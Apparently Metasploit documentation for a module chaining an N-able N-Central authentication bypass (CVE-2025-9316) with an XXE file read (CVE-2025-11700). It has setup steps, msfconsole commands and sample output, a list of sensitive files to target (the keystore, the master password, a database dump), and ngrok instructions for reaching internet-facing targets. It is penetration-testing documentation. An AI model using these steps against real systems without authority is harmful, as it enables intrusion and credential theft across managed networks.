## Vulnerable Application

This module targets N-able N-Central instances affected by CVE-2025-9316 (Unauthenticated Session Bypass) and CVE-2025-11700 (XXE).

Affected versions: N-Central < 2025.4.0.9

### Installation

N-able N-Central is a commercial RMM (Remote Monitoring and Management) platform. To obtain a vulnerable version for testing:

1. Contact N-able support or your account representative to request an evaluation copy
2. Download the installation package from the N-able customer portal
3. Follow the official installation guide provided by N-able
4. Ensure the installation is version < 2025.4.0.9 to be vulnerable

Note: This module requires an HTTP server to host the XXE DTD file.
For WAN testing, you need to expose the DTD server to the internet
(e.g., using ngrok).

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe`
1. Do: `set RHOSTS <target_ip>`
1. Do: `set RPORT 443`
1. Do: `run`
1. You should see the module obtain a session ID and read the target file via XXE

## Options

### APPLIANCE_ID

Appliance ID range to test (default: `1-30`). The module will iterate through this range to find a valid appliance ID that allows
session creation.

### FILE

File to read via XXE (default: `/etc/passwd`).

## Files of Interest

Examples of interesting files that can be read via XXE:

- `/etc/passwd` - User accounts
- `/opt/nable/var/ncsai/etc/ncbackup.conf` - N-Central backup configuration
- `/var/opt/n-central/tmp/ncbackup/ncbackup.bin` - PostgreSQL dump file
- `/opt/nable/etc/keystore.bcfks` - Encrypted keystore file
- `/opt/nable/etc/masterPassword` - Keystore password

### LOG_PATH

Directory path where the log file is written (default: `/opt/nable/webapps/ROOT/applianceLog`).
The module writes the XXE payload to a log file in this directory before triggering it.

## Advanced Options

### XXETriggerTimeout

Maximum time (in seconds) to wait for XXE file read to succeed (default: `10`). The module uses a retry mechanism to wait for the target
to fetch the DTD and process the XXE payload.

### DTD_PROTO

Protocol to use in DTD URL and for the local server (default: `http`). Options: `http` or `https`.
The local server SSL is synchronized with this option.
Note that N-Central (Java) cannot validate self-signed certificates, so HTTPS will only work if you provide a valid certificate via the
`SSLCert` option that is signed by a trusted certificate authority.

## Scenarios

### Local Network Testing

When the target N-Central server is on the same network or can reach your machine:

```
msf6 > use auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe
msf6 auxiliary(scanner/http/nable_ncentral_auth_bypass_xxe) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(scanner/http/nable_ncentral_auth_bypass_xxe) > set RPORT 443
RPORT => 443
msf6 auxiliary(scanner/http/nable_ncentral_auth_bypass_xxe) > set SRVHOST 192.168.1.50
SRVHOST => 192.168.1.50
msf6 auxiliary(scanner/http/nable_ncentral_auth_bypass_xxe) > set SRVPORT 8080
SRVPORT => 8080
msf6 auxiliary(scanner/http/nable_ncentral_auth_bypass_xxe) > run

[*] Using URL: http://192.168.1.50:8080/
[*] Started XXE DTD server on 192.168.1.50:8080
[*] Scanning 192.168.1.100:443 for N-Central vulnerabilities
[*] Testing appliance ID: 1
[*] Testing appliance ID: 2
[*] Testing appliance ID: 3
[+] 192.168.1.100:443 - Vulnerable to CVE-2025-9316 (Authentication Bypass)
[+] 192.168.1.100:443 - Obtained session ID: 1234567890 (appliance ID: 3)
[*] Testing CVE-2025-11700 (XXE) with session ID: 1234567890 (target file: /etc/passwd)
[*] DTD requested from 192.168.1.100
[+] 192.168.1.100:443 - XXE file read succeeded (CVE-2025-11700)
[+] File contents:

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
[*] Scanned 1 of 1 hosts (100% complete)
[*] Server stopped.
```

### WAN Testing with ngrok

For testing against targets on the internet, expose your DTD server using ngrok. There are two methods:

#### Method 1: ngrok HTTP forwarding

1. Start ngrok: `ngrok http 8080`
2. Use the HTTP URL provided by ngrok (e.g., `https://abc123def456.ngrok-free.app`):

```
use auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe
set RHOSTS target.example.com
set RPORT 443
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIHOST abc123def456.ngrok-free.app
set URIPORT 443
run
```

#### Method 2: ngrok TCP forwarding

1. Start ngrok: `ngrok tcp 7777`
2. Use the TCP address and port provided by ngrok (e.g., `0.tcp.eu.ngrok.io:12345`):

```
use auxiliary/scanner/http/nable_ncentral_auth_bypass_xxe
set RHOSTS target.example.com
set RPORT 443
set SRVHOST 0.0.0.0
set SRVPORT 7777
set URIHOST 0.tcp.eu.ngrok.io
set URIPORT 12345
run
```

Note: `URIHOST` and `URIPORT` specify the public ngrok address and port that the target will connect to. `SRVHOST` and `SRVPORT` should
be set to your local listening address and port.


## Troubleshooting

- **"Unexpected end of file from server"**: The target cannot reach your DTD server. Check firewall rules and ngrok configuration if using
  a tunnel.
- **"Session already exists"**: Some appliance IDs may be temporarily unavailable. The module will try other IDs automatically.
- **No session ID obtained**: Try expanding the `APPLIANCE_ID` range or verify the target is vulnerable (N-Central < 2025.4.0.9).
